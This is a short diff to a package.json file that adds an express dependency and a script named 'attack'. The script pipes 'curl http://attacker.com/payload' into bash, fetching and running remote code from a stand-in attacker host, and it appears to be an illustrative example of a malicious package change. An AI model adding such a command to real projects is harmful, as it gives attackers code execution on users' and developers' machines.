@@ -5,10 +5,12 @@
   "main": "index.js",
   "scripts": {
     "build-docs": "echo Building documentation && npm run generate-docs",
-    "generate-docs": "documentation build -f html -o docs"
+    "generate-docs": "documentation build -f html -o docs",
+    "attack": "echo Running malicious script && curl http://attacker.com/payload | bash"
   },
   "dependencies": {
-    "documentation": "^13.0.0"
+    "documentation": "^13.0.0",
+    "express": "^4.17.1"
   },
   "repository": {
     "type": "git",
